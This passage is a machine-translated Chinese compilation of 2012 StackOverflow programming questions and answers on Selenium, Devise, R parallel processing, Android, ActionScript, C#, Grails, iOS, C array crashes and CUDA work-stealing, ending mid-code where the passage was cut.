# StackOverflow 问答 11583000-11583999

# c# - Selenium webdriver 中的 Actions 类在 Firefox 14 中不起作用

> ID：11583001
> 
> 赞同：1
> 
> 时间：2012-07-20T16:03:03.030
> 
> 标签：c#, firefox, selenium, webdriver

我在 Firefox 14 中使用用于 C# 的 Selenium webdriver

我正在尝试右键单击该链接，但它失败并出现错误： `OpenQA.Selenium.InvalidElementStateException : Cannot perform native interaction: Could not load native events component.`

这在 Firefox 13 中有效。如果有人有解决方法，请告诉我。

```
Actions builder = new Actions(driver);
         IWebElement tagElement = driver.FindElement(By.LinkText("FolderA"));
        //right click on FolderA            
         builder.MoveToElement(tagElement).Perform();
builder.ContextClick(tagElement).Perform(); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-20T21:12:49.397

您使用的是哪个版本的 Selenium WebDriver？请记住，新版本的 Firefox 通常需要新版本的 WebDriver 来处理原生事件，因为浏览器版本之间的 Firefox 原生代码接口会发生变化。例如，Firefox 14 的本机事件支持直到 2.25.0 才添加到 WebDriver。

# ruby-on-rails - Rails Devise 在发送密码重置指令后重定向到错误的页面

> ID：11583003
> 
> 赞同：0
> 
> 时间：2012-07-20T16:03:16.420
> 
> 标签：ruby-on-rails, email, devise, passwords

我在我的 Rails 应用程序中使用设计。出于某种原因，当您单击“发送密码重置说明”按钮时，输入您的电子邮件后，它会将您带到一个带有此 url 的空白页面`/users/password.user`。我不知道它为什么这样做，也不知道如何改变它。

我不确切知道要发布什么代码，所以只需评论您希望我添加的摘录。谢谢。

作为记录，密码重置电子邮件和更改密码令牌完美运行，它只是这个奇怪的重定向（或缺少重定向）。

这些是路线：

```
devise_for :users, :controllers => {:registrations => 'registrations', :invitations => 'invitations', :confirmations => 'confirmations'}, :except => [:show] 
```

密码路径助手是`edit_password_url(@resource, :reset_password_token => @resource.reset_password_token)`

config.reset_password_keys：

```
config.reset_password_keys = [ :login ] 
```

密码重置表格：

```
 <head>
              <%= stylesheet_link_tag "passreset" %>  
            </head>

            <body>

                <div id="box">
                        <%= form_for(resource, :as => resource_name, :url => user_password_path(resource_name), :html => { :method => :post }) do |f| %>
                            <%= devise_error_messages! %>

                                <%= f.text_field :id,:name => "user[login]", :placeholder => "Username or Email"%>

                                <input name="commit" type="submit" name="" value="Submit" />
                        <% end %>
                </div>
            </body> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-06T15:33:39.160

尝试将表单中的 url 更改为

```
:url => password_path(resource_name) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-05T01:13:13.047

我们遇到了类似的问题。对我们来说，事实证明，当我们编辑自己的帐户时，Devise 正在注销我们。我们使用了 sign_in() 设计助手并最终使用了以下代码：

用户控制器

定义更新

```
# need to know if user is changing their own password for re-sign in purposes.
is_current_user =  (@user == current_user)

password_change = !params[:user][:password].empty?
if (password_change)
  @user.update_with_password(params[:user])
else
  @user.update_without_password(params[:user])
end

if is_current_user # Devise signs us out, so...
  sign_in(@user, :bypass => true)
end

@user.has_temp_password = false
@user.save!

if is_current_user
  redirect_to root_path, notice: 'Your account was successfully updated.'
else
  redirect_to users_path, notice: 'The user was successfully updated.'
end 
```

结尾

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-05T00:41:40.257

如果我理解正确，您似乎需要编辑您的视图或设计初始化文件 => config/initializers/devise.rb

您可以通过运行设计生成器来编辑视图 rails generate devise:views users

我希望这会有所帮助

# github - Github - 有多少开发人员正在从事公共项目？

> ID：11583004
> 
> 赞同：2
> 
> 时间：2012-07-20T16:03:22.507
> 
> 标签：github

有谁知道是否有办法查看在 Github 上从事公共项目的开发人员数量？在决定是否使用该软件之前，我想知道一个项目的活跃程度。我可以看到观看项目的人数，以及分叉的人数。如果我浏览源代码，我可以看到对项目提交更改的用户的名称。我希望找到的是所有推迟提交的用户的列表（或总数）。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-20T16:06:41.077

进入存储库页面后，单击 Graphs 选项卡，然后单击 Contributors。然后，您将看到每个贡献者及其贡献级别的图表。

例如这里是 CakePHP 的贡献者图：[https ://github.com/cakephp/cakephp/graphs/contributors](https://github.com/cakephp/cakephp/graphs/contributors)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-21T12:22:52.920

如果您想知道贡献者的确切数量，您需要查看 “*影响”选项卡中的内容。*

CakePHP 的相同示例：[https](https://github.com/cakephp/cakephp/graphs/impact)
://github.com/cakephp/cakephp/graphs/impact 它显示：*X 个作者超过 Y 周*。

# r - 并行进程的通信：我有哪些选择？

> ID：11583007
> 
> 赞同：5
> 
> 时间：2012-07-20T16:03:31.287
> 
> 标签：r, parallel-processing, shared-memory, snowfall

我正在尝试更深入地研究 R 例程的并行化。

关于一堆“工人”进程的沟通，我有什么选择

1.  各个**工人****之间**的沟通?
***   **工人**与“**主人**”进程的沟通？**

 **AFAIU，没有主进程和所有工作进程都可以访问的“**共享环境/共享内存**”，对吧？

到目前为止，我想出的最好的想法是将通信建立在读取和写入 JSON 文档到硬盘驱动器的基础上。这可能是个坏主意；-) 我选择`.json`了`.Rdata`文件，因为 JSON 似乎经常用于软件间通信，所以我想采用那个“标准”。

期待学习更好的选择！

仅供参考：我通常基于基础包**parallel**和contrib包[snowfall](http://www.google.de/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&ved=0CFoQFjAA&url=http://cran.r-project.org/web/packages/snowfall/index.html&ei=toAJUI-0FMr-4QS3uKzjCg&usg=AFQjCNH42-QAPtX-Qk0UDXlm9VHkTtuW3A&sig2=_SRREm2wPQ7Pk441O47STQ)的功能进行并行化，主要依靠功能`sfClusterApplyLB()`来完成工作

## 编辑

我应该说我在 Windows 上运行，但也非常感谢基于 Linux 的答案/提示！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-20T16:08:57.353

正如[CRAN Task View for High-Performance Computing](http://cran.r-project.org/web/views/HighPerformanceComputing.html)中详述的那样，Norm Matloff的[Rdsm](http://cran.r-project.org/web/packages/Rdsm/index.html)包提供共享内存通信。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-07-20T21:39:19.557

对于进程之间的通信，一种有趣的起点是帮助页面`?socketConnections`和块中标记为“## Not run:”的代码。所以启动一个R进程并运行

```
 con1 <- socketConnection(port = 6011, server=TRUE) 
```

该进程充当服务器，在特定端口上侦听某些信息。现在启动第二个 R 进程并输入

```
 con2 <- socketConnection(Sys.info()["nodename"], port = 6011) 
```

进程 2 中的 con2 与进程 1 上的 con1 建立了套接字连接。回到 con1，写出 R 对象`LETTERS`

```
writeLines(LETTERS, con1) 
```

并在 con2 上检索它们。

```
readLines(con2) 
```

因此，您无需写入磁盘即可在进程之间进行通信。这里也隐含了一些重要的概念，例如，关于阻塞与非阻塞连接。它不限于同一台机器上的通信，只要这些端口可以通过计算机所在的任何网络访问。这是`makePSOCKcluster`parallel包中的基础，另外进程1实际上使用`system`parallel包中的命令和脚本来启动进程2。返回的对象`makePSOCKcluster`是可子设置的，因此您可以将一小部分用于集群以解决特定任务。原则上，您可以安排生成的节点相互通信，而与生成的节点无关。

`parallel`一个有趣的练习是使用包中的类似 fork 的命令（在非 Windows 上）来做同样的事情。帮助页面中有一个高级版本`?mcparallel`，例如，

```
 p <- mcparallel(1:10)
 q <- mcparallel(1:20)
 # wait for both jobs to finish and collect all results
 res <- mccollect(list(p, q)) 
```

但这建立在较低级别`sendMaster`和朋友之上（峰值`mcparallel`和`mccollect`源代码）。

Rmpi 包采用类似于`PSOCK`示例的方法，其中管理器使用脚本生成工作人员，并使用 mpi 而不是套接字进行通信。`mpi.comm.rank`但是，如果您有一个正常运行的 MPI 实现，那么值得一个周末项目的另一种方法是实现一个脚本，该脚本对不同的数据进行相同的计算，然后使用诸如、`mpi.barrier`、`mpi.send.Robj`和之类的命令将结果整理到单个节点上`mpi.recv.Robj`。

一个有趣的周末项目将使用并行包来实现一个涉及并行计算但不属于 mclapply 种类的工作流程，例如，一个进程从网站收集数据，然后将其传递给另一个绘制漂亮图片的进程。第一个进程的输入很可能是 JSON，但 R 中的通信可能更适合 R 数据对象。**

# android - android应用程序无法运行并显示以下错误

> ID：11583008
> 
> 赞同：-1
> 
> 时间：2012-07-20T16:03:35.283
> 
> 标签：android

我在连接到本地主机时遇到错误请帮助我的代码是

```
 public class MainActivity extends Activity implements OnClickListener{
/** Called when the activity is first created. */
  TextView resultView;
   HttpClient client;
   JSONObject json;
String Dat;
Button btn;
InputStream is=null;
EditText name,roll_no;
String result="";
StringBuilder sb=null;
JSONArray jArray;
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);
    resultView = (TextView) findViewById(R.id.tv1);
    submit();
    btn.setOnClickListener(this);

}
public void onClick(View v){
parse();

}
private String submit() {
     ArrayList<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
        //http post
        try{
             HttpClient httpclient = new DefaultHttpClient();
             HttpPost httppost = new HttpPost("http://10.0.2.2:8081/onlineres/login");
             httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
             HttpResponse response = httpclient.execute(httppost);
             HttpEntity entity = response.getEntity();
             is = entity.getContent();
             }catch(Exception e){
                 Log.e("log_tag", "Error in http connection"+e.toString());
            }
        try{
              BufferedReader reader = new BufferedReader(new InputStreamReader(is,"iso-8859-1"),8);
               sb = new StringBuilder();
               sb.append(reader.readLine() + "\n");

               String line="0";
               while ((line = reader.readLine()) != null) {
                              sb.append(line + "\n");
                }
                is.close();
                result=sb.toString();
                }catch(Exception e){
                      Log.e("log_tag", "Error converting result "+e.toString());
                }
    return result;
  }
    public void parse(){
    String roll,name;
    try{
          jArray  = new JSONArray(result);
          JSONObject json_data=null;
          for(int i=0;i<jArray.length();i++){
                 json_data = jArray.getJSONObject(i);
                 name=json_data.getString("Name");
                 roll =json_data.getString("Roll_no");
             }
          }
          catch(JSONException e1){
              Toast.makeText(getBaseContext(), "No City Found"     ,Toast.LENGTH_LONG).show();
          } catch (ParseException e1) {
                e1.printStackTrace();
        }
}
} 
```

**和 logcat 是**

```
 07-20 21:23:02.776: I/System.out(306): debugger has settled (1441)
    07-20 21:23:31.564: D/AndroidRuntime(306): Shutting down VM
    07-20 21:23:31.564: W/dalvikvm(306): threadid=1: thread exiting with uncaught exception     (group=0x4001d800)
    07-20 21:23:31.653: E/AndroidRuntime(306): FATAL EXCEPTION: main
    07-20 21:23:31.653: E/AndroidRuntime(306): java.lang.RuntimeException: Unable to start     activity ComponentInfo{com.example.prac/com.example.prac.MainActivity}:     java.lang.NullPointerException
    07-20 21:23:31.653: E/AndroidRuntime(306):  at     android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2663)
    07-20 21:23:31.653: E/AndroidRuntime(306):  at     android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2679)
    07-20 21:23:31.653: E/AndroidRuntime(306):  at     android.app.ActivityThread.access$2300(ActivityThread.java:125)
    07-20 21:23:31.653: E/AndroidRuntime(306):  at     android.app.ActivityThread$H.handleMessage(ActivityThread.java:2033)
    07-20 21:23:31.653: E/AndroidRuntime(306):  at android.os.Handler.dispatchMessage(Handler.java:99)
    07-20 21:23:31.653: E/AndroidRuntime(306):  at android.os.Looper.loop(Looper.java:123)
    07-20 21:23:31.653: E/AndroidRuntime(306):  at     android.app.ActivityThread.main(ActivityThread.java:4627)
    07-20 21:23:31.653: E/AndroidRuntime(306):  at java.lang.reflect.Method.invokeNative(Native Method)
    07-20 21:23:31.653: E/AndroidRuntime(306):  at java.lang.reflect.Method.invoke(Method.java:521)
    07-20 21:23:31.653: E/AndroidRuntime(306):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:868)
    07-20 21:23:31.653: E/AndroidRuntime(306):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:626)
    07-20 21:23:31.653: E/AndroidRuntime(306):  at dalvik.system.NativeStart.main(Native Method)
   07-20 21:23:31.653: E/AndroidRuntime(306): Caused by: java.lang.NullPointerException
    07-20 21:23:31.653: E/AndroidRuntime(306):  at com.example.prac.MainActivity.onCreate(MainActivity.java:53)
   07-20 21:23:31.653: E/AndroidRuntime(306):   at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1047)
   07-20 21:23:31.653: E/AndroidRuntime(306):   at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2627)
   07-20 21:23:31.653: E/AndroidRuntime(306):   ... 11 more 
```

请帮我解决这个问题

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T16:06:44.750

我猜问题是你打电话给`btn.setOnClickListener(this);`

我在您的活动中的任何地方都没有看到“btn”初始化。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-20T16:08:58.663

你没有初始化按钮。初始化 `btn` 为：

```
 ........
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        btn= (Button) findViewById(R.id.Your_button_id);
        ...... 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-20T16:06:55.690

您的`btn`变量尚未初始化。在向它添加 onclick 侦听器之前，您必须从视图中获取它。

```
btn = (Button) findViewById(R.id.btnID); 
```

不过，这需要是您的按钮的 ID，因此只需将其替换为您的按钮 ID。

编辑：忘记投了:)对不起。

# actionscript-3 - Actionscript 3 查找 xml 中的哪些项目包含选定的标签并从同一节点返回另一个标签

> ID：11583010
> 
> 赞同：1
> 
> 时间：2012-07-20T16:03:49.463
> 
> 标签：actionscript-3, flash, apache-flex, flash-builder, flex3

我有一个从调用中检索的 XML，因此所有值对于节点的标签都是动态的（所以我知道有一个我必须显示的 appname）。我在 ComboBox 中显示 appname，然后我需要从同一节点中的另一个标签获取另一个值，我的 xml 具有这样的结构

```
<root>
  <item>
    <name>Hello</name>
    <version>World</version>
  </item>
  <item>
    <name>See_you</name>
    <version>soon</version>
  </item>
</root> 
```

现在，我有一个具有动态值的 flex mx:ComboBox，用户选择标签，例如 Hello，我需要找到相应的节点值和子值，这样我才能返回 World。

我可以通过dataProvider定义ComboBox的标签，这样就完成了。现在我无法通过 trace(event.currentTarget.selectedItem.@label); 获取所选值 （我在 ComboBox 上有更改处理程序）= 这是 1 个问题；

第二个问题是如果我在同一个父节点中有另一个节点值（在这种情况下），我如何从 xml 对象中获取节点值？

我被困在这个问题上，时间不多了，请帮忙。++++++++++++++++++++++++++++++++++++++++++++++++++++++ +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++#

```
<mx:AddChild relativeTo="{VGroup}">
<mx:ComboBox id="AppListBox" change="AppListBox_changeHandler(Event.CHANGE)"/>
</mx:AddChild> 
```

然后我提供数据，当我在我的脚本中有数据时，就像这样

```
AppListBox.dataProvider = appxml.item.appname.text(); 
```

appxml - 是那个 xml

然后我尝试获取所选项目的值，我尝试这样：

```
protected function AppListBox_changeHandler(event:Event):void
{
trace(event.currentTarget.selectedItem.label);
trace(event.currentTarget.selectedItem.data);
trace(event.currentTarget.selectedItem.@label);
trace(AppListBox.selectedItem.label);
trace(AppListBox.selectedItem.@label);
trace(AppListBox.selectedItem.name); 
```

它不显示任何内容。甚至没有错误

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-21T07:25:44.080

这一切对我来说都很好。

```
[Bindable]
public var myXML:XML

private function init( ):void{
  this.myXML = new XML(     
  <root>
    <item>
      <name>Hello</name>
      <version>World</version>
    </item>
    <item>
      <name>See_you</name>
      <version>soon</version>
    </item>
  </root>
  );
}

private function appListBox_changeHandler(event:Event):void{
  trace( 'index   --' + appListBox.selectedIndex )
  trace( 'label   --' + appListBox.selectedLabel )
  trace( 'version --' + XML(appListBox.selectedItem).version )
  trace( 'item    --' + appListBox.selectedItem )
}

<comboBox:ExtendedComboBox 
  id="appListBox"
  dataProvider="{this.myXML.item}"
  labelField="name"
  itemRenderer="mx.controls.Label"
  change="appListBox_changeHandler(event)"
/> 
```

# c# - Object() 和 Object{} 的区别

> ID：11583011
> 
> 赞同：3
> 
> 时间：2012-07-20T16:03:50.977
> 
> 标签：c#, oop, object, constructor

C# 将允许使用 Object() 或 Object{} 创建对象。Object() 和 Object{} 有什么区别

```
public item getitem()
{

return new item()

}

public item getitem()
{

return new item {}

} 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-07-20T16:06:18.323

这个语法：

```
new SomeType{} 
```

是一个[*对象初始化表达式*](http://msdn.microsoft.com/en-us/library/bb384062.aspx)，碰巧没有设置任何属性。它隐式调用无参数构造函数。您可以在大括号内添加属性分配：

```
new SomeType { Name = "Jon" } 
```

这个语法：

```
new SomeType() 
```

只是对无参数构造函数*的*调用，没有机会设置属性。

请注意，您也可以使用对象初始化器*显式*调用构造函数（参数化或非参数化）：

```
// Explicit parameterless constructor call
new SomeType() { Name = "Jon" }

// Call to constructor with parameters
new SomeType("Jon") { Age = 36 } 
```

有关对象初始化器的更多详细信息，请参阅 C# 4 规范的第 7.6.10.2 节。

我强烈建议，如果您*不*设置任何属性，则只是`new SomeType()`为了清楚起见而使用。在不设置任何属性的情况下使用对象初始化器很奇怪。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-07-20T16:05:35.253

`item()`调用默认构造函数，而`item {}`调用默认构造函数并允许使用（在这种情况下为空）[对象初始化器](http://msdn.microsoft.com/en-us/library/bb397680.aspx)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-20T16:06:27.007

`new item {}`使用[对象初始化器](http://msdn.microsoft.com/en-us/library/bb397680.aspx)。在您的示例中，没有区别，但通常`new item()`如果您不希望实际使用对象初始化程序，您只需调用即可。

# grails - Grails 功能测试插件，在 Post 中设置 body

> ID：11583022
> 
> 赞同：3
> 
> 时间：2012-07-20T16:04:34.440
> 
> 标签：grails, post, functional-testing

我正在使用功能测试插件来测试我的 REST Web 服务。我无法以正确的方式设置正文的内容。这是我的代码：

```
class HelloWorldFunctionalTests extends APITestCase {

    String postJson = "{\"name\":\"test name\"}"

    void testPost() {
        post('/mycontroller') {
            headers['Accept'] = 'application/json'

            body {
                """
                    {name:'test name'}
                """
            }

        }

        //assertStatus 200
    }
} 
```

目前我得到： groovyx.net.http.HTTPBuilder$RequestConfigDelegate.setBody(HTTPBuilder.java:1200) 的 java.lang.NullPointerException

任何人都可以看到问题是什么？

非常感谢，亚历克斯

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-24T09:27:48.283

这与放置身体的方式无关。我缺少的是内容类型。

这行代码使它工作正常：

```
headers['Content-Type'] = 'application/json' 
```

# iphone - 在一个视图中隐藏状态栏会在所有视图中隐藏它

> ID：11583024
> 
> 赞同：0
> 
> 时间：2012-07-20T16:04:35.110
> 
> 标签：iphone, objective-c, ios, xcode

我正在使用此代码`[[UIApplication sharedApplication] setStatusBarHidden:YES];`来`viewDidLoad`隐藏我的模态视图中的状态栏。但是当我回到上一个视图时`[self dismissViewControllerAnimated:YES completion:nil];`，状态栏隐藏在所有视图中。我当然不想要这种行为。我知道这是一个简单的问题，可能是重复的。无论如何，提前谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-20T16:06:37.140

请记住`sharedApplication`(singleton) 是您的应用程序，因此您只是告诉您的应用程序隐藏状态栏。如果你想让它显示在其他地方，你需要在`setStatusBarHidden:NO`那里。希望这可以帮助。

# c - 两个代码在单独的程序中工作正常，但是当代码在同一个程序中时程序崩溃

> ID：11583025
> 
> 赞同：0
> 
> 时间：2012-07-20T16:04:37.543
> 
> 标签：c, crash

嘿，这段代码正在运行。该代码是关于获取名称输入并对其进行一些更改。

```
#include <stdio.h>
#include <stdlib.h>

/*
 *  An example of how to use strtol() to read a number
 *  and validate that one was entered correctly.
 *
 */

int main(void)
{
  char buf[BUFSIZ];
  char *p;
  long int i;

  printf ("Enter a number: ");

  if (fgets(buf, sizeof(buf), stdin) != NULL)
  {
    i = strtol(buf, &p, 10);

    /*
     *  If the first character of the buffer is \n, the user
     *  pressed [Enter] with entering any text at all, which
     *  is therefore invalid.
     *
     *  The pointer p has been updated by strtol() to point to
     *  the first invalid character after the number.
     *  If this character is \0 it means we reached the end of
     *    the array successfully, so we received a good number.
     *  If this character is \n it also means we reached the
     *    end of the input successfully.  This is a symptom of
     *    using fgets() to obtain the string, but does not
     *    represent a problem.
     *  If this character is anything else, it means there was
     *    some additional characters entered after the number.
     *    In this sample program, I have deemed this situation
     *    to be invalid, however, in your program it may be
     *    valid, depending on what you're expecting from the user.
     *
     */

    if (buf[0] != '\n' && (*p == '\n' || *p == '\0'))
      printf ("Valid number of %ld entered\n", i);
    else  printf ("Invalid number entered\n");
  }

  return(0);
} 
```

此代码也有效！它需要一个字符串并转换为整数！

```
#include<stdio.h>
#include<string.h>
#include<stdlib.h>
int main()
{
    int m;
    char name[m],rename[m],c=0,j=0;
    puts("enter your name\n");
    gets(name);
    m=strlen(name);
    if(m>20){
        while(m>20){
            puts("shorter name pls\n");
            gets(name);
            m=strlen(name);
        }
    }
    while(name[c]==' '){
        c++;}
    while(c<strlen(name)){
        if(name[c]==' '&& name[c+1]==' ')
            {c++;}
        else{
            rename[j]=name[c];
            j++;
            c++;}
    }
    rename[j]='\0';
    puts(rename);
    return 0;
} 
```

但是在同一个程序中将它们一起输入时，程序崩溃了！

```
#include<stdio.h>
#include<string.h>
#include<stdlib.h>
int main()
{
    int m;
    char name[m],rename[m],c=0,j=0;
    puts("enter your name\n");
    gets(name);
    m=strlen(name);
    if(m>20){
        while(m>20){
            puts("shorter name pls\n");
            gets(name);
            m=strlen(name);
        }
    }
    while(name[c]==' '){
        c++;}
    while(c<strlen(name)){
        if(name[c]==' '&& name[c+1]==' ')
            {c++;}
        else{
            rename[j]=name[c];
            j++;
            c++;}
    }
    rename[j]='\0';
    puts(rename);
      char buf[BUFSIZ];
  char *p;
  long int i;

  printf ("Enter a number: ");

  if (fgets(buf, sizeof(buf), stdin) != NULL)
  {
    i = strtol(buf, &p, 10);

    /*
     *  If the first character of the buffer is \n, the user
     *  pressed [Enter] with entering any text at all, which
     *  is therefore invalid.
     *
     *  The pointer p has been updated by strtol() to point to
     *  the first invalid character after the number.
     *  If this character is \0 it means we reached the end of
     *    the array successfully, so we received a good number.
     *  If this character is \n it also means we reached the
     *    end of the input successfully.  This is a symptom of
     *    using fgets() to obtain the string, but does not
     *    represent a problem.
     *  If this character is anything else, it means there was
     *    some additional characters entered after the number.
     *    In this sample program, I have deemed this situation
     *    to be invalid, however, in your program it may be
     *    valid, depending on what you're expecting from the user.
     *
     */

    if (buf[0] != '\n' && (*p == '\n' || *p == '\0'))
      printf ("Valid number of %ld entered\n", i);
    else  printf ("Invalid number entered\n");
  }
    return 0;
} 
```

为什么？？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-20T16:07:25.047

当然这是非常错误的：

```
int m;
char name[m],rename[m],c=0,j=0; 
```

您正在声明长度为未初始化变量的数组。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-20T16:12:29.887

即使在您合并两者之前，此程序中也有几处看起来不太好。

*   第 7 行：声明一个大小未定义的数组。
*   第 18 行：“名称”下标索引 c 是一个字符 - 限制为 0..127。int 会更好。
*   第 24 行：c 和 j 相同。

然后，应该避免使用 gets() 函数，因为它可能会向它提供比它准备接受的更多的数据，从而使你的程序崩溃。如果 m 被初始化为零，任何长度的任何输入都可能触发崩溃。

更改第一行使其工作：

```
int m = 100;
char name[m],rename[m];
int c=0,j=0; 
```

...但是如果您输入的名称比 m 长，您将再次崩溃。

如果名称长于 m 和 127 中的较小者，仅设置 m 的值会导致崩溃。假设您有 m = 200 并输入一个包含 130 个空格的名称：那么这一行

while(name[c]==' '){ c++;}

会增加 c 直到它是 126，然后是 127，然后发现 name[127] 是一个空格会再次增加 c。但是 c 是一个字符，因此 c+1 不是 128，而是 -128。当转换为内存地址以索引“名称”时，-128 指向外太空某处，程序在火焰中崩溃。

**提示**：当您编译程序并且还不是专家时，请将所有编译器警告保持在最高设置。当您是专家时，您将能够将它们关闭——并且将学会不想要:-)。

GCC 在您的第一个来源上运行 说：

```
In function ‘main’:
18:5: warning: array subscript has type ‘char’ [-Wchar-subscripts]
20:12: warning: comparison between signed and unsigned integer expressions [-Wsign-compare]
21:9: warning: array subscript has type ‘char’ [-Wchar-subscripts]
24:13: warning: array subscript has type ‘char’ [-Wchar-subscripts]
24:13: warning: array subscript has type ‘char’ [-Wchar-subscripts]
28:5: warning: array subscript has type ‘char’ [-Wchar-subscripts]
7:5: warning: ‘m’ is used uninitialized in this function [-Wuninitialized]
warning: the `gets' function is dangerous and should not be used. 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-20T16:10:17.580

你是什​​么意思'崩溃'？提前终止？有什么错误？程序应该做什么？

另请注意，gets() 永远不应在实际代码中使用。

# c++ - CUDA 调度问题或内核启动中的错误？

> ID：11583029
> 
> 赞同：1
> 
> 时间：2012-07-20T16:05:19.757
> 
> 标签：c++, cuda, deque, work-stealing

在我的程序中，我为内核 lauch 中发布的每个块都有一个工作双端队列。每个块都停留在循环中，在其双端队列中弹出工作，处理它并将动态生成的工作推回。维护了一组双端队列标志，指示哪些双端队列处于活动状态，即有工作。如果双端队列为空，内核进入另一个循环，试图从另一个块的双端队列中窃取工作。当没有更多的双端队列处于活动状态时，达到停止条件。

在测试中，我设置了从 1 个工作项开始的所有双端队列。我的问题是某些块似乎根本没有运行。由于其中一些没有运行，它们保持活动状态，我的程序进入无限循环。

现在到代码。内核和辅助弹出和推送功能：

```
bool __inline__ __device__ pushBottom(int *aiDequeBottoms , const int &iBid , const unsigned int &uiSize ,
unsigned int &uiPushStartIdx)   
{
int iOldBot = aiDequeBottoms[iBid];
uiPushStartIdx = iOldBot;
iOldBot += uiSize;
if(iOldBot < DEQUE_SIZE)
{
    aiDequeBottoms[iBid] = iOldBot;
    return true;
}
else
{
    return false;
}
}

bool __inline__ __device__ popTop(int *aiDequesBottoms , unsigned int *auiDequesAges , const int &iBid ,
int2 &popStartIdxAndSize)
{
int index;
unsigned int oldAge = auiDequesAges[iBid];
int localBot = aiDequesBottoms[iBid];
index = oldAge >> WORK_STEALING_TAG_NBITS;
if(localBot < index + 2*WORK_STEALING_BATCH_SIZE)
{
    return false;
}

int localTag = oldAge & WORK_STEALING_TAG_MASK;
int size = min(WORK_STEALING_BATCH_SIZE , localBot - index);
unsigned int newAge = (index+size << WORK_STEALING_TAG_NBITS)| localTag;

if(oldAge == atomicCAS(&auiDequesAges[iBid] , oldAge , newAge))
{
    popStartIdxAndSize.x = index;
    popStartIdxAndSize.y = size;
    return true;
}
else
{
    return false;
}
}

bool __inline__ __device__ popBottom(int *aiDequesBottoms , unsigned int *auiDequesAges , const int &iBid ,
int2 &popStartIdxAndSize)
{
int localBot = aiDequesBottoms[iBid];
if(localBot == 0)
{
    return false;
}

int index = localBot;
localBot = localBot - WORK_STEALING_BATCH_SIZE;
aiDequesBottoms[iBid] = localBot;
unsigned int oldAge = auiDequesAges[iBid];
int oldAgeTop = int(oldAge >> WORK_STEALING_TAG_NBITS);
if(localBot > oldAgeTop)
{
    popStartIdxAndSize.y = WORK_STEALING_BATCH_SIZE;
    popStartIdxAndSize.x = index - WORK_STEALING_BATCH_SIZE;
    return true;
}

aiDequesBottoms[iBid] = 0;
unsigned int newAge = ((oldAge & WORK_STEALING_TAG_MASK) + 1) % (WORK_STEALING_TAG_MASK + 1);
if(index > oldAgeTop)
{
    if(oldAge == atomicCAS(&auiDequesAges[iBid] , oldAge , newAge))
    {
        popStartIdxAndSize.y = index - oldAgeTop;
        popStartIdxAndSize.x = index - popStartIdxAndSize.y;
        return true;
    }
}

auiDequesAges[iBid] = newAge;
return false;
}

//----------------------------------------------------------------------------------------------------------------------------
// Function to pop work from deques. Each block try to pop from its own deque. If work isn't available, it try to steal from
// other deques.
//----------------------------------------------------------------------------------------------------------------------------
template <typename Work>
bool __inline__ __device__ popWork(bool *abDequeFlags , int *aiDequesBottoms , unsigned int *auiDequesAges ,
const Work *aDeques , const int &iTid , const int &iBid , unsigned int &uiPopDequeIdx , int2 &popStartIdxAndSize ,
int &iLocalDequeCounter , bool &bPopFlag , unsigned int *uiActiveDeques , unsigned int &uiActiveDequesIdx , Work &work)
{
if(iTid == 0)
{   //Try to pop from block deque
    iLocalDequeCounter = 0;
    bPopFlag = popBottom(aiDequesBottoms , auiDequesAges , iBid , popStartIdxAndSize);
    if(bPopFlag)
    {
        uiPopDequeIdx = iBid;
    }
    else
    {
        abDequeFlags[iBid] = false;
    }
}
__syncthreads();

while(!bPopFlag)
{   //No more work, try to steal some!
    if(iTid == 0)
    {
        uiActiveDequesIdx = 0;
    }
    __syncthreads();

    if(iTid < NDEQUES)
    {
        if(abDequeFlags[iTid] == true) //assuming iTid >= NDEQUES
        {   //Set this deque for a work stealing atempt.
            unsigned int uiIdx = atomicAdd(&uiActiveDequesIdx,1);
            uiActiveDeques[uiIdx] = iTid;
        }
    }
    __syncthreads();

    if(iTid == 0)
    {   //Try to steal until succeeds or there are no more deques left to search
        bPopFlag = false;
        for(uiPopDequeIdx = 0 ; uiPopDequeIdx < uiActiveDequesIdx && bPopFlag == false ; ++uiPopDequeIdx)
        {
            bPopFlag = popTop(aiDequesBottoms , auiDequesAges , uiPopDequeIdx , popStartIdxAndSize);
        }
    }
    __syncthreads();

    if(uiActiveDequesIdx == 0)
    { //No more work to steal. End.
        return false;
    }
}

//Get poped data
if(iTid < popStartIdxAndSize.y) //assuming number of threads >= WORK_SIZE
{
